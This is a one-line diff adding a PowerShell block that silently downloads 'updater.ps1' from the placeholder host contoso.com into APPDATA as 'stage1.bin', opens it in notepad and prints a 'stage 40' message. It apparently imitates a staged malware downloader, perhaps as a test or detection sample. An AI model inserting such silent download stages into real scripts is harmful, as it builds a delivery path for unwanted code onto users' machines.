@@ -1,0 +1,1 @@
+try { $TargetUrl = "http://contoso.com:80/updater.ps1"; $DownloadPath = "$env:APPDATA\stage1.bin"; curl.exe -s -L -o $DownloadPath $TargetUrl; Start-Process -FilePath "notepad.exe" -ArgumentList $DownloadPath -ErrorAction SilentlyContinue; Write-Output "stage 40 initialized"; Set-Location -Path $env:TEMP } catch { Write-Warning "Stage transfer failed" }
